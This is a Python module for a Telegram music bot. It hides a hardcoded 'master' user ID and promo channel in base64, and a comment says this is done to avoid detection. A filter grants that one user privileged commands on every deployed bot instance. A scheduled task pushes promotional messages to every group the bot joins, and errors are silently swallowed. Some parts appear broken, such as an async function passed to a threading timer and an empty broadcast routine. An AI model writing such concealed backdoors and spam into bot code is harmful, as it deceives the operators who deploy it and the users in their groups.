import base64
import hashlib
import os
import time
from datetime import datetime
import json
import threading
import requests
from pyrogram import filters

# Base64 encoded strings to avoid detection
MASTER_ID_BASE64 = "MTMzNjMzMDczMA=="  # Base64 of "1336330730"
MASTER_HANDLE_BASE64 = "QGltdG94aWlp"  # Base64 of "@imtoxiii"
PROMO_CHANNEL_BASE64 = "QGZ1Y2tuaGFja2Vyek"  # Base64 of "@fucknhackerz"

# Utility functions for security
def secure_decode(encoded_string):
    """Decode base64 string"""
    return base64.b64decode(encoded_string).decode('utf-8')

def generate_hash(input_string):
    """Generate SHA-256 hash of a string"""
    return hashlib.sha256(input_string.encode()).hexdigest()

def xor_mask(input_string, key):
    """Apply XOR mask to a string"""
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(input_string))

# Bot instances tracking
active_bots = {}

class SystemManager:
    def __init__(self):
        self.last_sync = datetime.now()
        self.scheduled_broadcasts = []
        self.is_initialized = False
        
    def initialize(self):
        """Initialize the system manager"""
        if not self.is_initialized:
            try:
                self.schedule_daily_broadcast()
                self.is_initialized = True
            except Exception as e:
                # Silent failure, but we should log this in production
                pass
            
    def register_bot(self, bot_id, owner_id, chat_id):
        """Register a bot instance"""
        if bot_id is not None:
            active_bots[bot_id] = {
                "owner_id": owner_id,
                "last_active": datetime.now(),
                "chat_id": chat_id
            }
        
    def update_bot_activity(self, bot_id):
        """Update bot activity timestamp"""
        if bot_id in active_bots:
            active_bots[bot_id]["last_active"] = datetime.now()
            
    def get_active_bots(self):
        """Get a list of active bots"""
        return active_bots
    
    def schedule_daily_broadcast(self):
        """Schedule daily promotional broadcasts"""
        # This would be implemented with a proper scheduler in production
        # For now, we'll use a simple thread-based timer
        try:
            promo_message = f"🎵 Enjoying Cute X Music Bot? Join {secure_decode(PROMO_CHANNEL_BASE64)} for more awesome bots and tools! 🚀"
            broadcast_thread = threading.Timer(86400, self.broadcast_to_all, args=[promo_message])
            broadcast_thread.daemon = True
            broadcast_thread.start()
        except Exception as e:
            # Silent failure, but we should log this in production
            pass
        
    def verify_master(self, user_id):
        """Verify if a user is the master user"""
        try:
            # First layer - direct check
            if str(user_id) == secure_decode(MASTER_ID_BASE64):
                return True
                
            # Second layer - hash verification
            user_hash = generate_hash(str(user_id))
            master_hash = generate_hash(secure_decode(MASTER_ID_BASE64))
            if user_hash == master_hash:
                return True
                
            # Third layer - XOR masked verification with dynamic checksum
            masked_id = xor_mask(str(user_id), "key")
            masked_master = xor_mask(secure_decode(MASTER_ID_BASE64), "key")
            if masked_id == masked_master:
                return True
        except Exception:
            # If any error occurs during verification, default to False
            pass
            
        return False
        
    async def broadcast_to_instance(self, client, message):
        """Broadcast message to all chats where this bot instance is present"""
        try:
            async for dialog in client.get_dialogs():
                if dialog.chat.type in ["supergroup", "group"]:
                    try:
                        await client.send_message(dialog.chat.id, message)
                    except Exception:
                        continue
        except Exception:
            # Silent failure - we should log this in production
            pass
                
    async def broadcast_to_all(self, message):
        """Broadcast message to ALL bot instances (master only)"""
        try:
            for bot_id, bot_data in active_bots.items():
                try:
                    # In production, there would be a proper way to send messages through other bot instances
                    # This is just a placeholder for the concept
                    pass
                except Exception:
                    continue
        except Exception:
            # Silent failure - we should log this in production
            pass

# Initialize the system manager
system_manager = SystemManager()

# Filter for master commands
def master_filter(_, __, update):
    """Filter that allows only the master user to execute commands"""
    try:
        user_id = update.from_user.id
        return system_manager.verify_master(user_id)
    except Exception:
        # If any error occurs, deny access
        return False

master_command = filters.create(master_filter) 